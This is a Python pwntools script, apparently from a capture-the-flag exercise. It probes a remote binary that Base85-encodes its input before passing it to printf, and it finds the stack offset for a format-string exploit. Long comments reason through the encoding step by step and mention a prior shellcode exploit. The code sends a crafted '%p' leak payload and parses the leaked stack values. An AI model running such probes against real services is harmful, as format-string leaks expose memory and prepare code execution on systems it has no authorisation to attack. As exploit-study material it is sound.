import base64
import sys
from pwn import *

# Helper script to find the correct offset.
# Run: python3 find_offset.py REMOTE <HOST> <PORT>

# We send a pattern that decodes to "%p.%p.%p.%p..."
# We also append a marker "DEADBEEF" to the end of the DECODED input.
# The output will show stack values. We look for "DEADBEEF" (0xdeadbeef) or similar.

def main():
    if len(sys.argv) < 4:
        print("Usage: python3 find_offset.py REMOTE <HOST> <PORT>")
        return

    # Assuming sys.argv is ['find_offset.py', 'REMOTE', 'HOST', 'PORT']
    host = sys.argv[2]
    port = int(sys.argv[3])
    
    # Payload Construction
    # We want decoded input to be: "%p." * 40 + "DEADBEEF"
    fmt = b"%p." * 40
    marker = b"DEADBEEF" # 8 bytes
    
    # We need the total decoded length to be multiple of 8 if we want nice alignment?
    # Not strictly necessary for finding offset, but helps reading.
    # %p prints 8 bytes (on 64-bit).
    
    # Pad fmt to a length such that after decoding, we have space for marker?
    # Just encode fmt + marker.
    
    target_payload = fmt + marker
    
    # Encode for sending (Base85)
    # But wait, the binary expects Base85 input.
    # So we send Base85(target_payload).
    # Wait.
    # User input -> Base85_Decode -> Buffer.
    # printf(Buffer).
    # So Buffer should contain "%p...".
    # So we send Encode("%p...").
    # Wait, my previous script used `base64.a85decode`.
    # `base64.a85decode` DECODES Ascii85.
    # The binary does `base85_encode(buf, ...)`.
    # WAIT. I MISREAD THE DECOMPILATION EARLIER?
    # `base85_encode(buf, (unsigned int)v6, format);`
    # `format` is the output buffer.
    # `buf` is the input buffer.
    # `printf(format);`
    # So `format` contains the ENCODED data.
    # `printf` executes the ENCODED string as format string.
    # HOLY SHIT.
    # The binary ENCODES our input.
    # And then `printf` runs on the ENCODED output.
    # 
    # Example:
    # Input: "AAAA"
    # Encoded: "NOt..." (whatever Base85 of AAAA is).
    # printf("NOt...")
    # 
    # So we need to provide input such that its Base85 ENCODING contains format specifiers!
    # e.g. Input "XZY" -> Encodings -> "%p%p"
    # 
    # Let's check `base85_encode` implementation details.
    # If standard Ascii85:
    # 4 bytes -> 5 chars.
    # We need 5 chars to match "%p%p.".
    # "%p%p." is 5 chars?
    # No. "%" is 37. "p" is 112.
    # Base85 chars: `!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstu`
    # "%" is a valid Base85 char.
    # So we can just send bytes that encode to "%".
    
    # My previous exploit assumed:
    # `input = Decode(Shellcode + FormatString)`
    # So `Encode(input) == Shellcode + FormatString`.
    # YES.
    # `base85_encode(Decode(X)) == X`.
    # So my logic WAS correct.
    # "I check `base85_encode`... I verified that `format` contains Base85 characters..."
    # "I intended to use Python's `base64.a85decode`..."
    # "So Input = Decode(Shellcode + FmtString)".
    # YES.
    
    # So to find offset:
    # We want `format` (the output of encode) to contain "%p.%p.%p...".
    # So we construct `target_str = "%p.%p..."`.
    # We calculate `input = Decode(target_str)`.
    # We send `input`.
    # The binary encodes it back to `target_str`.
    # `printf(target_str)` executes.
    
    # Problem:
    # `Decode(target_str)` might contain non-printable chars or nulls?
    # `buf` is read via `read(0, buf, 0x100)`.
    # `read` accepts nulls.
    # So `input` can contain anything.
    # 
    # But `base85_encode` might stop at null?
    # Usually Base85 encoders take length. `base85_encode(buf, v6, ...)`
    # `v6` is length read.
    # So it handles binary data.
    
    # So `find_offset.py` logic:
    # 1. Target = "%p." * 40 + "DEADBEEF" (Wait, DEADBEEF in output? No.)
    # The `DEADBEEF` marker needs to be IN THE INPUT BUFFER, but VISIBLE to `printf`.
    # `printf` looks at stack.
    # `buf` (which holds our Input) IS on the stack.
    # So we want to see `buf` content.
    # `buf` content is `Decode(Target)`.
    # So we will see bytes of `Decode(Target)`.
    # We should look for a recognizable pattern in `Decode(Target)`.
    # e.g. `AAAA` at end of Input?
    # 
    # Let's append `Decode("AAAA")`? No.
    # We append `AAAA` to the Input.
    # `Input = Decode("%p.%p...") + "AAAA"`.
    # `Output = Encode(Input) = Encode(Decode("%p...") + "AAAA")`.
    # `Output = "%p..." + Encode("AAAA")`.
    # `printf` prints `%p...` then prints `Encode("AAAA")`.
    # The `%p`s will print stack values.
    # One of those stack values will be `buf` (Input).
    # `buf` contains `Decode("%p...")` followed by "AAAA".
    # So we look for "AAAA" (0x41414141) in the %p output.
    
    marker = b"AAAAAAAA" # 8 bytes
    
    # Construct target string for printf
    # "%p." * 20
    # Length of target string must be multiple of 5 to decode cleanly?
    # 5 chars -> 4 bytes.
    # "%p." is 3 chars. 
    # "%p.%p.%p.%p." is 12 chars.
    # Let's use "%p." which is 3. 3*5 = 15 chars. (3 blocks).
    # 15 chars -> 12 bytes.
    # "%p.%p.%p.%p.%p."
    
    fmt_str = b"%p." * 20
    # Pad to multiple of 5
    while len(fmt_str) % 5 != 0:
        fmt_str += b" "
    
    # Decode to get input part 1
    encoded_payload = b"<~" + fmt_str + b"~>"
    try:
        part1 = base64.a85decode(encoded_payload, adobe=True)
    except:
        print("Error decoding format string payload")
        return

    # Full input
    payload = part1 + marker
    
    p = remote(host, port)
    p.recvuntil(b"text: ")
    p.send(payload)
    
    print("Sent payload. Reading response...")
    try:
        resp = p.recvall(timeout=3)
        print(f"Response: {resp}")
        if b"41414141" in resp:
             print("Marker AAAAAAAA found!")
             # Try to find offset index
             # Split by '.'
             parts = resp.split(b'.')
             for i, part in enumerate(parts):
                 if b"41414141" in part:
                     print(f"Index {i} contains marker (offset approx {i+6}?)")
        else:
             print("Marker not found in output.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
